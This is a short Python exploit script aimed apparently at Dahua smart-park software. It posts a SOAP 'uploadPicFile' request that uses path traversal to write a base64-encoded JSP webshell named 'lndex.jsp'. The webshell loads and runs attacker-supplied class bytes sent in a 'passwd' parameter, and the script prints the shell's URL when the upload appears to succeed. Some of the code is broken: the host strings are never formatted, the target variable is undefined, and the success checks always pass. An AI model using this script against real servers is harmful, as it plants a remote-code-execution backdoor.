import requests
import xml.etree.ElementTree as ET

def send_req(url):
    soap_request = """
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
        <soapenv:Header/>
        <soapenv:Body>
            <res:uploadPicFile>
                <arg0>/../../lndex.jsp</arg0>
                <arg1>PCUhCiAgICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgewogICAgICAgIFUoQ2xhc3NMb2FkZXIgYykgewogICAgICAgICAgICBzdXBlcihjKTsKICAgICAgICB9CiAgICAgICAgcHVibGljIENsYXNzIGcoYnl0ZVtdIGIpIHsKICAgICAgICAgICAgcmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsIDAsIGIubGVuZ3RoKTsKICAgICAgICB9CiAgICB9CiAKICAgIHB1YmxpYyBieXRlW10gYmFzZTY0RGVjb2RlKFN0cmluZyBzdHIpIHRocm93cyBFeGNlcHRpb24gewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RGVjb2RlciIpOwogICAgICAgICAgICByZXR1cm4gKGJ5dGVbXSkgY2xhenouZ2V0TWV0aG9kKCJkZWNvZGVCdWZmZXIiLCBTdHJpbmcuY2xhc3MpLmludm9rZShjbGF6ei5uZXdJbnN0YW5jZSgpLCBzdHIpOwogICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgIENsYXNzIGNsYXp6ID0gQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkJhc2U2NCIpOwogICAgICAgICAgICBPYmplY3QgZGVjb2RlciA9IGNsYXp6LmdldE1ldGhvZCgiZ2V0RGVjb2RlciIpLmludm9rZShudWxsKTsKICAgICAgICAgICAgcmV0dXJuIChieXRlW10pIGRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZSIsIFN0cmluZy5jbGFzcykuaW52b2tlKGRlY29kZXIsIHN0cik7CiAgICAgICAgfQogICAgfQolPgo8JQogICAgU3RyaW5nIGNscyA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwYXNzd2QiKTsKICAgIGlmIChjbHMgIT0gbnVsbCkgewogICAgICAgIG5ldyBVKHRoaXMuZ2V0Q2xhc3MoKS5nZXRDbGFzc0xvYWRlcigpKS5nKGJhc2U2NERlY29kZShjbHMpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7CiAgICB9CiU+</arg1>
            </res:uploadPicFile>
        </soapenv:Body>
    </soapenv:Envelope>
    """
    headers = {
        "Content-Type": "text/xml;charset=UTF-8"
    }

    response = requests.post(url+'/emap/webservice/gis/soap/poi', data=soap_request, headers=headers, timeout=5)
    if response.status_code == 200 and ("Bad Request" not in response.text or "404" not in response.text or "400" not in response.text):
        print(url+'/upload/lndex.jsp'+' success')
        print(response.text)
    response1 = requests.post(url+'/emap/webservice/gis/soap/bitmap', data=soap_request, headers=headers, timeout=5)
    if response1.status_code == 200 and ("Bad Request" not in response1.text or "404" not in response1.text or "400" not in response.text):
        print(url+'/upload/lndex.jsp'+' success')
        print(response1.text)
    else:
        print(url+' error')

def get_url(file):
        send_req(r"https://{file}")
        send_req(r"http://{file}")            
if __name__ == '__main__':
    if file is None:
        print('please input target')
    else:
        get_url(file)

